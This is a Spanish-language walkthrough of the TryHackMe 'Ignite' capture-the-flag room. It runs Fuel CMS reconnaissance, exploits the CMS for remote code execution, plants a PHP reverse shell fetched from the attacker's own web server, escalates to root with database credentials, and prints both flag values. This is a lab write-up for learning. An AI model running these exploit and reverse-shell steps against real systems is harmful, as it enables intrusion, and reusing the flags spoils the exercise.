# Objetivo

https://tryhackme.com/r/room/ignite

IP: 10.10.172.69

- User.txt: 6470e394cbf6dab6a91682cc8585059b
- Root.txt: b9bbcb33e11b80be759c4e844862482d

---

# Procesos

- ## Escanear puertos

  ```
  sudo nmap -sV <SERVICE_VERSION> -O <OS> -T4 <INTENSIDAD> <IP>
  ```

  ```
  sudo nmap -sV -O -T4 10.10.56.241
  ```

  - `-sV`: 80/tcp open http Apache httpd 2.4.18 ((Ubuntu))

  - `-O`: No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

  - `-T4`: En un rango de 1 a 5 lo agresivo (ruidoso) que quieres que sea el escaneo

- ## Fuzzear

  ```
  feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT>
  ```

  ```
  feroxbuster -u http://10.10.172.69:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o outputIgnite.txt
  ```

- ## Revisar pagina web

  - ### `Robot.txt`:

    ```
    User-agent: *
    Disallow: /fuel/
    ```

  - ### `/fuel` (Login page):

    user: admin
    password: admin

- ## Buscar vunerabilidades:

  ```
  searchsploit <SERVICE>
  ```

  ```
  searchsploit fuel

  > ------------------------------- ---------------------------------
   Exploit Title                   |  Path
  --------------------------------- ---------------------------------
  AMD Fuel Service - 'Fuel.service | windows/local/49535.txt
  Franklin Fueling Systems  TS-550 | hardware/remote/51321.txt
  Franklin Fueling Systems Colibri | linux/remote/50861.txt
  Franklin Fueling Systems TS-550  | hardware/remote/51382.txt
  Franklin Fueling TS-550 evo 2.0. | hardware/webapps/31180.txt
  fuel CMS 1.4.1 - Remote Code Exe | linux/webapps/47138.py
  Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/49487.rb
  Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/50477.py
  Fuel CMS 1.4.13 - 'col' Blind SQ | php/webapps/50523.txt
  Fuel CMS 1.4.7 - 'col' SQL Injec | php/webapps/48741.txt
  Fuel CMS 1.4.8 - 'fuel_replace_i | php/webapps/48778.txt
  Fuel CMS 1.5.0 - Cross-Site Requ | php/webapps/50884.txt
  --------------------------------- ---------------------------------
  Shellcodes: No Results
  ```

  - ### Explotar vulnerabilidad:

  1.  Descargar exploit y acceder a la shell

      https://www.exploit-db.com/exploits/50477

      ```
      python3 50477.py -u http://10.10.172.69
      ```

  2.  Una vez accedido a la shell:

      ```
      cat /home/www-data/flag.txt

      > 6470e394cbf6dab6a91682cc8585059b
      ```

  3.  Mejorar la shell (Reverse shell):

      1. Descargar y descomprimir:

         ```
         wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz

         tar -xvzf php-reverse-shell-1.0.tar.gz
         ```

      2. Levantar web server en el directorio de la reverse shell para pasarla a la maquina objetivo:

         ```
         python3 -m http.server 80
         ```

      3. Conectarme al servidor desde la maquina objetivo:

         ```
         wget http://10.21.104.33/shell.php
         ```

      4. Mejorar shell:

         ```
         python -c 'import pty; pty.spawn("/bin/bash")'
         ```

      5. Escuchar desde mi maquina con netcat:

         ```
         netcat -nvlp 8085
         ```

      6. Cargar la sell en el navegador: http://10.10.172.69/shell.php

  4.  Hacernos root:

      1. Buscar archivo de configuracion:

         ```
         cd /var/www/html/fuel/application/config
         ```

      2. Conseguir credenciales root e identidicarnos como root:

         ```
         cat database.php

         > user: root
         password: mememe
         ```

         ```
         su root
         ```

      3. Acceder al directorio root (previamente oculto) y conseguir la flag:

         ```
         cd /
         cd root
         ```

         ```
         cat root.txt

         > b9bbcb33e11b80be759c4e844862482d
         ```
